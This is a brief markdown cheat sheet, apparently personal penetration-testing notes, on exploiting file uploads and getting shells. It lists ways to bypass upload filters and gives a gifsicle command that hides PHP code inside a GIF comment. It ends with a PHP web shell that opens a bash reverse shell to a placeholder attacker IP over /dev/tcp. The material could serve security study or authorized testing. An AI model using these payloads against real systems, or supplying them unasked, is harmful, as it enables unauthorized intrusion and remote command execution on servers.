# Exploit  

## File upload
**Bypass rules**
- Missed extensions of the same file type
- Insert double extension
- Fake directory structure (file attack.jpg is php, send /attack.jpg/foo.php)
- Change case of extension (pHp, PhP, aSp)
- ***Windows***: use shortname
- Neutral characters that are removed automatically
  - ***Windows***: spaces
  - ***Linux***: trailing dots
**Image check abuse**
```
apt-get install gifsicle
gifsicle < trojan.gif -- comment "<?php echo 'Current PHP version: ' . phpversion(); ?>" > output.php.gif
```
## Shells
- ***Shell***: Piece of code that enables one to interact with a system.
- ***Bind vs. Reverse bind***: Bind listens to a port and gives a shell to whom it connects. Reverse bind sends a shell to someone listening to a port somewhere else.

### Shellcode


**Notes**: 
- ***Msfvenom***: Full reference (Offensive Security Metasploit Unleashed [Msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/))  

### Web Shells

**PHP Webshell (bash)**
```
<?php echo shell_exec("bash -i >& /dev/tcp/<attackerIp>/4444 0>&1"); ?>
```